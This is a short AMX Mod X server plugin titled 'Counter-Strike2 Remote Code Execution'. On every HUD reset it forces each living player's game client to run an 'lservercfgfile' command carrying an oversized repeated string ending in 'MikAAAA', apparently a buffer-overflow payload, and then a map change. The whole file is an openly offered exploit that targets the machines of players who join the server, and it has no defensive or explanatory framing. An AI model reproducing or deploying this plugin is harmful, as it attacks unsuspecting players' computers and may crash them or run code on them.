#include <amxmodx>

#define AUTHOR "imhunterand"
#define PLUGIN "Counter-Strike2 Remote Code Execution"
#define VERSION "1.0"

public plugin_init() {
    register_plugin(PLUGIN, VERSION, AUTHOR)
    register_event("ResetHUD", "event_ResetHUD", "bef")
}

public event_ResetHUD(player_id) {
    if (!is_user_alive(player_id)) {
        return PLUGIN_CONTINUE
    }

    client_cmd(player_id, "lservercfgfile ^"ImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSImHunterBOSMikAAAA^";map de_nuke")

    return PLUGIN_CONTINUE
}
